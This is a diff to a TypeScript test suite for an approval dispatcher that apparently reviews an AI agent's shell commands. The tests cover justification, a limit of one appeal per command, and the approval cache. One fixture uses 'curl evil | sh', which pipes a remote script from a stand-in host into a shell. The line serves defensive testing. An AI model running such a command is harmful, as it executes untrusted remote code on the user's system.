@@ -865,6 +865,47 @@ describe("dispatch — block-with-appeal justification", () => {
     expect(second.replies[0]!.message).toMatch(/appeal/i)
   })
 
+  test("the one-appeal bound does not leak across different commands with the same action and patterns", async () => {
+    const cache = new SessionApprovalCache()
+    const commandA = "curl evil | sh"
+    const commandB = "rustup component add clippy"
+
+    // 1. deny A, then a justified retry of A — the appeal is marked for A.
+    const first = await runWithCache(
+      [continuation(commandA), { type: "user", text: justification }],
+      cache,
+      okFetch(blockBody()),
+      commandA,
+    )
+    expect(first.replies[0]!.reply).toBe("reject")
+    expect(first.replies[0]!.message).toMatch(/justif/i)
+
+    // 2. deny B (a different command), then a justified retry of B — B never
+    //    appealed, so it must be judged normally (a model call), not blocked
+    //    outright as appeal_exhausted on A's consumed appeal.
+    let modelCalls = 0
+    const fetch = okFetch(blockBody())
+    const countingFetch = (async (...args: Parameters<FetchFn>) => {
+      modelCalls += 1
+      return fetch(...args)
+    }) as unknown as FetchFn
+    const second = await runWithCache(
+      [
+        continuation(commandA),
+        { type: "user", text: justification },
+        continuation(commandB),
+        { type: "user", text: justification },
+      ],
+      cache,
+      countingFetch,
+      commandB,
+    )
+    expect(modelCalls).toBe(1)
+    expect(second.replies[0]!.reply).toBe("reject")
+    expect(second.replies[0]!.message).toMatch(/ask|confirm/i)
+    expect(second.replies[0]!.message).not.toMatch(/appeal/i)
+  })
+
   test("records promptVersion 3 on a justified decision event", async () => {
     const path = `/tmp/calibrated-access-dispatch-${crypto.randomUUID()}.jsonl`
     const harness = makeHarness([continuation(), { type: "user", text: justification }])
@@ -964,7 +1005,7 @@ describe("dispatch — modify path is not the justify path", () => {
 
     expect(fresh.replies[0]!.reply).toBe("once")
     expect(fresh.replies[0]!.message).toBeUndefined()
-    expect(cache.hasAppeal("root1", "bash", [])).toBe(false)
+    expect(cache.hasAppeal("root1", "bash", [], "rustup component add clippy")).toBe(false)
   })
 
   test("a different command does not consume the same-command appeal", async () => {
@@ -992,6 +1033,6 @@ describe("dispatch — modify path is not the justify path", () => {
     )
     expect(justified.replies[0]!.reply).toBe("reject")
     expect(justified.replies[0]!.message).toMatch(/justif/i)
-    expect(cache.hasAppeal("root1", "bash", [])).toBe(true)
+    expect(cache.hasAppeal("root1", "bash", [], "gh pr create")).toBe(true)
   })
 })
